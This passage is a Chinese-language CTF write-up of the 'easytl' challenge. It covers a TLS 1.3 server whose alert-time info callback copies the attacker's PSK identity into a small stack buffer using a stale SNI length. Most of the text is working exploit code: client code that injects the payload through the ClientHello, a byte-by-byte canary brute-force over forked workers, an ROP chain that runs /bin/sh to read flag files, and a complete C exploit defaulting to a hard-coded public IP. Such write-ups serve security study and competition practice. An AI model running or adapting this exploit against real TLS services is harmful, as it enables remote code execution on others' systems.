    *id = identity;  
    *idlen = identity_len;
    *sess = s;

    return 1;
}
```


## 第三步：设置攻击者控制的 SNI

EXP 创建指定长度的 SNI：

```clike
char *sni = malloc(sni_len + 1);

memset(sni, 'S', sni_len);
sni[sni_len] = 0;

SSL_set_tlsext_host_name(ssl, sni);
```

最终 ROP 使用：sni_len = 248 

来源是：`OFF_RET + sizeof(chain)` 104 + 144 = 248


## 第四步：发起正常 TLS 1.3 握手

客户端初始化：

```clike
SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());

SSL_CTX_set_min_proto_version(
    ctx,
    TLS1_3_VERSION
);

SSL_CTX_set_max_proto_version(
    ctx,
    TLS1_3_VERSION
);

SSL_CTX_set_ciphersuites(
    ctx,
    "TLS_AES_256_GCM_SHA384"
);

SSL_CTX_set_psk_use_session_callback(
    ctx,
    use_psk
);
```

创建具体连接：

```clike
SSL *ssl = SSL_new(ctx);

SSL_set_fd(ssl, fd);
SSL_set_tlsext_host_name(ssl, sni);

int ok = SSL_connect(ssl) == 1;
```

调用：SSL_connect(ssl)时，客户端 OpenSSL 会主动调用客户端的 `use_psk()`，然后生成完整 ClientHello。


ClientHello 到达服务端后的回调执行流：

服务端此时正在：SSL_accept(server_ssl) 

收到 ClientHello 后，OpenSSL 解析其中的扩展。

```clike
SSL_accept()
    ↓
解析 ClientHello
    ↓
解析 SNI extension
    ↓
调用 sub_40320A (sni_servername_cb)
    ↓
保存 g_sni_ptr 和 g_sni_len
    ↓
解析 pre_shared_key extension
    ↓
调用 sub_402DBB (external_psk_find_session_cb）
    ↓
验证 identity
    ↓
保存 g_psk_ptr 和 g_psk_len
    ↓
创建 SSL_SESSION
    ↓
验证 PSK binder
    ↓
握手状态变化
    ↓
调用 sub_4030D5 （vulnerable_tls_info_cb）
```

SNI 和 PSK 回调在 OpenSSL 内部的微观先后可能由扩展处理阶段决定，但利用只要求在相关 info callback 更新状态前，两组全局变量都已经完成设置。本题实际运行满足这一点。


## 第五步：正常握手完成

easytl的main逻辑伪代码：

```clike
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  unsigned int listen_fd; // [rsp+1Ch] [rbp-54h]
  __int64 client_ssl; // [rsp+28h] [rbp-48h]
  __int64 v5; // [rsp+40h] [rbp-30h]
  __int64 ctx; // [rsp+48h] [rbp-28h]
  _WORD v7[2]; // [rsp+50h] [rbp-20h] BYREF
  int v8; // [rsp+54h] [rbp-1Ch]
  unsigned __int64 v9; // [rsp+68h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  memset(v7, 0, 16);
  v7[0] = 2;
  v7[1] = sub_795F90(1443);
  v8 = sub_795F80(0);
  listen_fd = socket(2, 1, 0);
  if ( (listen_fd & 0x80000000) != 0 )
    error(1);
  if ( bind(listen_fd, v7, 16) < 0 )
    error(1);
  if ( listen(listen_fd, 1) < 0 )
    error(1);
  v5 = TLS_server_method(listen_fd);
  ctx = SSL_CTX_new(v5);
  if ( !ctx )
    error(1);
  configure_tls_server_ctx(ctx);
  client_ssl = accept_fork_and_tls_handshake(ctx, listen_fd);
  client_handle(client_ssl);
}
```

可以看到前面做了socket() bind() listen()创建tcp连接，然后创建ServerTLS类型的 SSL_CTX，并在configure_tls_server_ctx(ctx)中进行配置：

```clike
__int64 __fastcall configure_tls_server_ctx(__int64 ctx)
{
  SSL_CTX_set_ciphersuites(ctx);
  SSL_CTX_set_info_callback(ctx, info_callback);
  SSL_CTX_set_psk_find_session_callback(ctx, psk_find_session_cb);
  if ( SSL_CTX_use_certificate_file(ctx, "server.crt", 1) <= 0 )
  {
    sub_4B8490(stderr);
    error(1);
  }
  if ( SSL_CTX_set_PrivateKey_file(ctx, "server.key", 1) <= 0 )
  {
    sub_4B8490(stderr);
    error(1);
  }
  SSL_CTX_set_tlsext_servername_callback(ctx, 53, sni_cb);
  return SSL_CTX_set_tlsext_servername_arg(ctx, 54, 0, 0);
}
```

随后Server设置好的ctx配置接受客户端连接，处理监听器listen_fd中传来的客户端数据。通过多次 fork 将连接交给独立的后台子进程处理，并完成服务端 TLS 握手，最终返回已建立连接的 SSL 对象。TLS握手SSL_accept()的过程中调用了三个回调函数，解析了客户端发来的ClientHello，完成了第一阶段准备错误的“PSK指针 + SNI长度”状态 


```clike
__int64 __fastcall accept_fork_and_tls_handshake(__int64 ctx, unsigned int listen_fd)
{
  __int64 result; // rax
  int v3; // [rsp+14h] [rbp-1Ch] BYREF
  unsigned int client_fd; // [rsp+18h] [rbp-18h]
  pid_t v5; // [rsp+1Ch] [rbp-14h]
  __int64 ssl; // [rsp+20h] [rbp-10h]
  unsigned __int64 v7; // [rsp+28h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  while ( 1 )
  {
    client_fd = accept(listen_fd);
    v5 = fork();
    if ( !v5 )
      break;
    waitpid(v5, &v3, 2);
    if ( v5 < 0 )
      error(0xFFFFFFFFLL);
    close(client_fd);
  }
  v5 = fork();
  if ( v5 )
    error(0);
  v5 = fork();
  if ( v5 )
    error(0);
  close(listen_fd);
  sub_7922E0(80);
  ssl = SSL_new(ctx);
  SSL_set_fd(ssl, client_fd);
  if ( SSL_accept(ssl) <= 0 )
  {
    sub_4B8490(stderr);
    error(1);
  }
  result = ssl;
  if ( v7 != __readfsqword(0x28u) )
    stack_check_fail();
  return result;
}
```


客户端成功向Server注入携带payload的ClientHello后，`SSL_connect(ssl)`返回1。

服务端使用fork()复制出的子进程解析ClientHello，`SSL_accept(ssl)`也成功返回。


随后服务端进入业务循环，使用read_32()读取32字节数据，每个特定数据对应一个指令。

```clike
void __fastcall __noreturn client_handle(__int64 a1)
{
  unsigned int v1; // [rsp+1Ch] [rbp-4h]

  qword_970F30 = 0;
  dword_970F38 = 0;
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        v1 = read_32(a1);
        if ( v1 != 0xDC375626 )
          break;
        EDIT(a1);
      }
      if ( v1 <= 0xDC375626 )
        break;
LABEL_18:
      SSL_write(a1, "error", 5);
    }
    if ( v1 == 0xD21FEF03 )
    {
      DEL(a1);
    }
    else
    {
      if ( v1 > 0xD21FEF03 )
        goto LABEL_18;
      if ( v1 == 0x89954D3E )
      {
        GET(a1);
      }
      else
      {
        if ( v1 > 0x89954D3E )
          goto LABEL_18;
        if ( v1 == 0x6C5A5850 )
        {
          ENC(a1);
        }
        else
        {
          if ( v1 > 0x6C5A5850 )
            goto LABEL_18;
          if ( v1 == 0x363BBED5 )
          {
            DEC(a1);
          }
          else
          {
            if ( v1 != 0x38432A87 )
              goto LABEL_18;
            ADD(a1);
          }
        }
      }
    }
  }
}
```

它此时期待收到 ADD、GET 等4字节命令。

read32()的底层实现是：

```clike
__int64 __fastcall read_32(__int64 a1)
{
  __int64 result; // rax
  _BYTE v2[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  memset();
  sub_403471(a1, v2, 4u);
  result = (v2[1] << 8) | (v2[2] << 16) | (v2[3] << 24) | v2[0];
  if ( v3 != __readfsqword(0x28u) )
    stack_check_fail();
  return result;
}
```

而 `sub_403471(a1, v2, 4u)`则是：

```clike
unsigned __int64 __fastcall sub_403471(__int64 a1, _BYTE *a2, unsigned int a3)
{
  unsigned __int64 result; // rax

  while ( 1 )
  {
    result = a3--;
    if ( !result )
      break;
    if ( _libc_SSL_read(a1, a2, 1) <= 0 )
      error(1);
    if ( *a2 == 10 )
    {
      *a2 = 0;
      return a2;
    }
    ++a2;
  }
  return result;
}
```

底层就是SSL_read()。

EXP 不发送业务命令，而是发送非法 TLS record来触发SSL_read()的alert。


## 第六步：发送非法 TLS record，触发alert栈溢出

EXP：

```clike
unsigned char badrec[21] = {
    0x17, 0x03, 0x03, 0x00, 0x10,
    0, 0, 0, 0,
    0, 0, 0, 0,
    0, 0, 0, 0,
    0, 0, 0, 0
};

send_all(fd, badrec, sizeof(badrec));
```


这里必须使用底层 TCP：`send(fd, ...)` 不能使用：`SSL_write(ssl, ...)`

原因是SSL_write 会自动生成合法加密记录，send 可以发送攻击者手工构造的非法记录

record 含义：

```clike
17          TLS Application Data
03 03       legacy record version
00 10       body长度16
00×16       无效密文/无效认证标签
```

服务端的业务层 `SSL_read()` 读取这条 record：

```clike
SSL_read()
    ↓
解析 TLS record
    ↓
尝试 AES-256-GCM 解密
    ↓
认证标签校验失败
    ↓
产生 fatal TLS alert
    ↓
再次调用 info callback
```

这一次进入的是info callback 的alert分支：

```clike
fd = SSL_get_fd(ssl);

if (g_psk_ptr) {
    g_current_ptr = g_psk_ptr;

    if (g_psk_len == 0x20)
        log_error();
}

write(fd, "error", 5);
```

重新设置了：`g_current_ptr = g_psk_ptr;`

但是没有执行：`g_current_len = g_psk_len;`

所以旧值仍然是我们第一次发送ClientHello设置的：`g_current_len = g_sni_len = 248`

最终进入存在漏洞的函数log_error()

```clike
void log_error(void)
{
    char buf[0x50];

    memset(buf, 0, sizeof(buf));

    memcpy(
        buf,
        g_current_ptr,
        g_current_len
    );

    fprintf(stderr, "%s error\n", buf);
}
```

缓冲区只有0x50字节，g_current_ptr指向我们上次构造的PSK identity中的payload，g_current_len有248字节长，可覆盖到canary、栈基址和返回地址，所以在第一次发送PSK_identity的过程中，直接在payload当中的合适偏移处写入ROP，即可拿到shell。

```clike
  const char fixed[] = "1401518dc5d7641ccd41593a5d812410"; 
  memset(identity, 'A', sizeof(identity));
  memcpy(identity, fixed, 32);
  identity[32] = 0;                 /* strlen()==32, identity_len remains large */
  identity_len = 0x100;
  
  static void put64(unsigned char *p, uint64_t v) { memcpy(p, &v, 8); }

  /* 18 qwords fit below the 255-byte SNI cap: read(4,bss,0x100),
     then execve("/bin/sh", argv, NULL). */
  enum { OFF_CANARY=88, OFF_RBP=96, OFF_RET=104 };
  const uint64_t POP_RAX=0x5f6c9a, POP_RDI=0x4251bd;
  const uint64_t POP_RSI=0x5e9a79, POP_RDX=0x52f0d2;
  const uint64_t SYSCALL_RET=0x792859, BSS=0x979000;
  memset(identity + 33, 'B', sizeof(identity) - 33);
  memcpy(identity + OFF_CANARY, canary, 8);
  put64(identity + OFF_RBP, 0);
  uint64_t chain[] = {
    POP_RAX, 0, POP_RDI, 4, POP_RSI, BSS, POP_RDX, 0x100, SYSCALL_RET,
    POP_RAX, 59, POP_RDI, BSS, POP_RSI, BSS+0xd0, POP_RDX, 0, SYSCALL_RET
  };
  memcpy(identity + OFF_RET, chain, sizeof(chain));
  identity_len = 0x100;

  unsigned char stage[0x100]; memset(stage, 0, sizeof(stage));
  memcpy(stage, "/bin/sh", 8);
  memcpy(stage + 0x10, "-c", 3);
  const char cmd[] =
    "cat /flag* 2>/dev/null >&4;cat flag* 2>/dev/null >&4;"
    "cat /home/ctf/flag* 2>/dev/null >&4";
  memcpy(stage + 0x20, cmd, sizeof(cmd));
  put64(stage + 0xd0, BSS);
  put64(stage + 0xd8, BSS + 0x10);
  put64(stage + 0xe0, BSS + 0x20);
  put64(stage + 0xe8, 0);
```

 第一段ROP read(4, BSS, 0x100)，读取stage到BSS段

stage保存的是第二段ROP中execve的参数。写到BSS段上后：

```clike
地址        偏移   内容
----------  -----  --------------------------------
0x979000    0x00   "/bin/sh\0"
0x979010    0x10   "-c\0"
0x979020    0x20   "cat /flag* ... >&4\0"

0x9790D0    0xD0   0x979000
0x9790D8    0xD8   0x979010
0x9790E0    0xE0   0x979020
0x9790E8    0xE8   0x0000000000000000
```

第二段ROP execve("/bin/sh", argv, NULL)，第二段ROP传给寄存器的值即为bss段上execve参数的地址。execve第二个参数argv可理解为给execve(“/bin/sh”)，即shell的指令。ROP中rsi设置为BSS + 0xd0，所以argv：

```clike
char *argv[] = {
    (char *)0x979000,  // "/bin/sh"
    (char *)0x979010,  // "-c"
    (char *)0x979020,  // "cat ..."
    NULL
};
```

于是第二段 ROP等价于：

```clike
execve(
    "/bin/sh",
    {
        "/bin/sh",
        "-c",
        "cat /flag* ... >&4",
        NULL
    },
    NULL
);
```

注意客户端 socket 是 fd 4，所以read要从fd 4读取stage，服务端正常文件描述符布局通常为：

```clike
0  stdin
1  stdout
2  stderr
3  listen socket
4  accept返回的client socket
```

`accept()` 返回当前最低的空闲文件描述符，所以通常是`client_fd = 4`

worker 后面关闭的是`close(listen_fd);  // 关闭fd 3`但客户端 socket 仍然保持为fd 4

当然在上述传入ROP读取flag并发回客户端socket_fd 4之前，还需要使用canary_oracle，通过父进程fork()出来的子进程去爆破父进程的canary。

```clike
  int have_canary = 0;
  if (argc > 3 && strlen(argv[3]) == 16) {
    have_canary = 1;
    for (int i = 0; i < 8; i++) {
      unsigned int x;
      if (sscanf(argv[3] + i*2, "%2x", &x) != 1) { have_canary = 0; break; }
      canary[i] = (unsigned char)x;
    }
    if (have_canary) fprintf(stderr, "[+] using supplied canary %s\n", argv[3]);
  }

  for (int i = 0; !have_canary && i < 8; i++) {
    int found = 0;
    int start = (i == 0) ? 0 : 0;
    int end = (i == 0) ? 1 : 256;  /* Linux canary low byte is NUL. */
    for (int g = start; g < end; g++) {
      canary[i] = (unsigned char)g;
      memcpy(identity + 88, canary, (size_t)i + 1);
      int r;
      do { r = oracle(host, port, 88u + (size_t)i + 1, NULL, 0, NULL, NULL); }
      while (r < 0 && usleep(20000) == 0);
      if (r == 1) { found = 1; break; }
    }
    if (!found) { fprintf(stderr, "[-] canary byte %d not found\n", i); return 1; }
    fprintf(stderr, "[+] canary[%d] = %02x  full=", i, canary[i]);
    for (int j = 0; j <= i; j++) fprintf(stderr, "%02x", canary[j]);
    fputc('\n', stderr);
  }
```

oracle()即为客户端连接服务端的建立连接、发送内容并回传response的函数，客户端向服务端TLS握手、发送ClientHello注入payload和非法record触发alert都在其内部实现。我们控制服务端shell输出的flag就被oracle自动保存在response里面。

```clike
/* Returns 1 iff the callback survived and executed write(fd,"error",5). */
static int oracle(const char *host, const char *port, size_t sni_len,
                  const unsigned char *stage, size_t stage_len,
                  unsigned char *capture, size_t *capture_len) {
  int fd = tcp_connect(host, port);
  if (fd < 0) return -1;
  char *sni = malloc(sni_len + 1);
  memset(sni, 'S', sni_len); sni[sni_len] = 0;
  SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
  SSL_CTX_set_min_proto_version(ctx, TLS1_3_VERSION);
  SSL_CTX_set_max_proto_version(ctx, TLS1_3_VERSION);
  SSL_CTX_set_ciphersuites(ctx, "TLS_AES_256_GCM_SHA384");
  SSL_CTX_set_psk_use_session_callback(ctx, use_psk);
  SSL *ssl = SSL_new(ctx);
  SSL_set_fd(ssl, fd);
  SSL_set_tlsext_host_name(ssl, sni);
  int ok = SSL_connect(ssl) == 1;
  if (ok) {
    unsigned char badrec[21] = {0x17,0x03,0x03,0x00,0x10};
    ok = send_all(fd, badrec, sizeof(badrec));
    if (ok && stage && stage_len) ok = send_all(fd, stage, stage_len);
  }
  struct timeval tv = {2, 0};
  setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
  unsigned char out[16384]; size_t used = 0;
  while (ok && used < sizeof(out)) {
    ssize_t n = recv(fd, out + used, sizeof(out) - used, 0);
    if (n <= 0) break;
    used += (size_t)n;
  }
  int survived = used >= 5 && memcmp(out + used - 5, "error", 5) == 0;
  if (capture && capture_len) {
    size_t n = used < *capture_len ? used : *capture_len;
    memcpy(capture, out, n); *capture_len = n;
  }
  SSL_free(ssl); SSL_CTX_free(ctx); free(sni); close(fd);
  return ok ? survived : -1;
}
```

oracle回传响应后，响应提取中还有一个细节，客户端接收的数据里可能混有 TLS alert、明文错误信息和 shell 输出，因此不能假设 flag 从响应第一个字节开始。

用下面的代码找到回传数据中的flag开头：

```clike
unsigned char *fp = memmem(
    response,
    response_len,
    "flag{",
    5
);
```

找到开头后找结尾：

```clike
unsigned char *end = memchr(
    fp,
    '}',
    response + response_len - fp
);
```

最后输出到stdout：

```clike
fwrite(
    fp,
    1,
    end - fp + 1,
    stdout
);
```

完整的EXP实现：

```clike
#define _GNU_SOURCE
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <arpa/inet.h>
#include <errno.h>
#include <netdb.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <unistd.h>

/* easytl: TLS 1.3 external-PSK info-callback stack overflow exploit. */
static unsigned char identity[512];
static size_t identity_len;
static const unsigned char master_key[64] = {
  0x8b,0xd3,0xd0,0x2f,0x8a,0xc2,0xe2,0xa0,0x63,0x73,0x57,0x79,0xb0,0xa2,0xea,0x98,
  0x0d,0x0b,0xaa,0x08,0x31,0xed,0x9f,0xce,0x8b,0x81,0x25,0xd7,0x9a,0xf5,0x98,0xb5,
  0x13,0x82,0xd3,0x23,0x1b,0x15,0x63,0x4d,0xc4,0xe5,0xc5,0x1a,0xa1,0xe5,0x7a,0xfc,
  0x03,0x8b,0xbd,0xf1,0x12,0x17,0xb4,0x02,0x88,0x7a,0xd7,0x44,0xf7,0x37,0xe9,0x52
};

static int use_psk(SSL *ssl, const EVP_MD *md,
                   const unsigned char **id, size_t *idlen,
                   SSL_SESSION **sess) {
  (void)md;
  SSL_SESSION *s = SSL_SESSION_new();
  unsigned char csid[2] = {0x13, 0x02};
  const SSL_CIPHER *cipher = SSL_CIPHER_find(ssl, csid);
  if (!s || !cipher ||
      !SSL_SESSION_set1_master_key(s, master_key, sizeof(master_key)) ||
      !SSL_SESSION_set_cipher(s, cipher) ||
      !SSL_SESSION_set_protocol_version(s, TLS1_3_VERSION)) {
    if (s) SSL_SESSION_free(s);
    return 0;
  }
  *id = identity; *idlen = identity_len; *sess = s;
  return 1;
}

static int tcp_connect(const char *host, const char *port) {
  struct addrinfo hints = {0}, *ai = NULL, *p;
  hints.ai_socktype = SOCK_STREAM;
  if (getaddrinfo(host, port, &hints, &ai)) return -1;
  int fd = -1;
  for (p = ai; p; p = p->ai_next) {
    fd = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
    if (fd >= 0 && connect(fd, p->ai_addr, p->ai_addrlen) == 0) break;
    if (fd >= 0) close(fd);
    fd = -1;
  }
  freeaddrinfo(ai);
  return fd;
}

static int send_all(int fd, const void *buf, size_t n) {
  const unsigned char *p = buf;
  while (n) {
    ssize_t r = send(fd, p, n, MSG_NOSIGNAL);
    if (r <= 0) return 0;
    p += r; n -= (size_t)r;
  }
  return 1;
}

/* Returns 1 iff the callback survived and executed write(fd,"error",5). */
static int oracle(const char *host, const char *port, size_t sni_len,
                  const unsigned char *stage, size_t stage_len,
                  unsigned char *capture, size_t *capture_len) {
  int fd = tcp_connect(host, port);
  if (fd < 0) return -1;
  char *sni = malloc(sni_len + 1);
  memset(sni, 'S', sni_len); sni[sni_len] = 0;
  SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
  SSL_CTX_set_min_proto_version(ctx, TLS1_3_VERSION);
  SSL_CTX_set_max_proto_version(ctx, TLS1_3_VERSION);
  SSL_CTX_set_ciphersuites(ctx, "TLS_AES_256_GCM_SHA384");
  SSL_CTX_set_psk_use_session_callback(ctx, use_psk);
  SSL *ssl = SSL_new(ctx);
  SSL_set_fd(ssl, fd);
  SSL_set_tlsext_host_name(ssl, sni);
  int ok = SSL_connect(ssl) == 1;
  if (ok) {
    unsigned char badrec[21] = {0x17,0x03,0x03,0x00,0x10};
    ok = send_all(fd, badrec, sizeof(badrec));
    if (ok && stage && stage_len) ok = send_all(fd, stage, stage_len);
  }
  struct timeval tv = {2, 0};
  setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
  unsigned char out[16384]; size_t used = 0;
  while (ok && used < sizeof(out)) {
    ssize_t n = recv(fd, out + used, sizeof(out) - used, 0);
    if (n <= 0) break;
    used += (size_t)n;
  }
  int survived = used >= 5 && memcmp(out + used - 5, "error", 5) == 0;
  if (capture && capture_len) {
    size_t n = used < *capture_len ? used : *capture_len;
    memcpy(capture, out, n); *capture_len = n;
  }
  SSL_free(ssl); SSL_CTX_free(ctx); free(sni); close(fd);
  return ok ? survived : -1;
}

static void put64(unsigned char *p, uint64_t v) { memcpy(p, &v, 8); }

int main(int argc, char **argv) {
  const char *host = argc > 1 ? argv[1] : "47.105.112.170";
  const char *port = argc > 2 ? argv[2] : "1443";
  const char fixed[] = "1401518dc5d7641ccd41593a5d812410";
  unsigned char canary[8] = {0};

  memset(identity, 'A', sizeof(identity));
  memcpy(identity, fixed, 32);
  identity[32] = 0;                 /* strlen()==32, identity_len remains large */
  identity_len = 0x100;

  int have_canary = 0;
  if (argc > 3 && strlen(argv[3]) == 16) {
    have_canary = 1;
    for (int i = 0; i < 8; i++) {
      unsigned int x;
      if (sscanf(argv[3] + i*2, "%2x", &x) != 1) { have_canary = 0; break; }
      canary[i] = (unsigned char)x;
    }
    if (have_canary) fprintf(stderr, "[+] using supplied canary %s\n", argv[3]);
  }

  for (int i = 0; !have_canary && i < 8; i++) {
    int found = 0;
    int start = (i == 0) ? 0 : 0;
    int end = (i == 0) ? 1 : 256;  /* Linux canary low byte is NUL. */
    for (int g = start; g < end; g++) {
      canary[i] = (unsigned char)g;
      memcpy(identity + 88, canary, (size_t)i + 1);
      int r;
      do { r = oracle(host, port, 88u + (size_t)i + 1, NULL, 0, NULL, NULL); }
      while (r < 0 && usleep(20000) == 0);
      if (r == 1) { found = 1; break; }
    }
    if (!found) { fprintf(stderr, "[-] canary byte %d not found\n", i); return 1; }
    fprintf(stderr, "[+] canary[%d] = %02x  full=", i, canary[i]);
    for (int j = 0; j <= i; j++) fprintf(stderr, "%02x", canary[j]);
    fputc('\n', stderr);
  }

  /* 18 qwords fit below the 255-byte SNI cap: read(4,bss,0x100),
     then execve("/bin/sh", argv, NULL). */
  enum { OFF_CANARY=88, OFF_RBP=96, OFF_RET=104 };
  const uint64_t POP_RAX=0x5f6c9a, POP_RDI=0x4251bd;
  const uint64_t POP_RSI=0x5e9a79, POP_RDX=0x52f0d2;
  const uint64_t SYSCALL_RET=0x792859, BSS=0x979000;
  memset(identity + 33, 'B', sizeof(identity) - 33);
  memcpy(identity + OFF_CANARY, canary, 8);
  put64(identity + OFF_RBP, 0);
  uint64_t chain[] = {
    POP_RAX, 0, POP_RDI, 4, POP_RSI, BSS, POP_RDX, 0x100, SYSCALL_RET,
    POP_RAX, 59, POP_RDI, BSS, POP_RSI, BSS+0xd0, POP_RDX, 0, SYSCALL_RET
  };
  memcpy(identity + OFF_RET, chain, sizeof(chain));
  identity_len = 0x100;

  unsigned char stage[0x100]; memset(stage, 0, sizeof(stage));
  memcpy(stage, "/bin/sh", 8);
  memcpy(stage + 0x10, "-c", 3);
  const char cmd[] =
    "cat /flag* 2>/dev/null >&4;cat flag* 2>/dev/null >&4;"
    "cat /home/ctf/flag* 2>/dev/null >&4";
  memcpy(stage + 0x20, cmd, sizeof(cmd));
  put64(stage + 0xd0, BSS);
  put64(stage + 0xd8, BSS + 0x10);
  put64(stage + 0xe0, BSS + 0x20);
  put64(stage + 0xe8, 0);

  unsigned char response[16384]; size_t response_len = sizeof(response);
  fprintf(stderr, "[*] launching ROP...\n");
  oracle(host, port, OFF_RET + sizeof(chain), stage, sizeof(stage),
         response, &response_len);
  unsigned char *fp = memmem(response, response_len, "flag{", 5);
  if (fp) {
    unsigned char *end = memchr(fp, '}', response + response_len - fp);
    if (end) {
      fprintf(stdout, "[+] flag: ");
      fwrite(fp, 1, (size_t)(end - fp + 1), stdout);
      fputc('\n', stdout);
      return 0;
    }
  }
  fprintf(stderr, "[-] flag marker not found; dumping raw response\n");
  fwrite(response, 1, response_len, stdout); fputc('\n', stdout);
  return 0;
}
```

+++++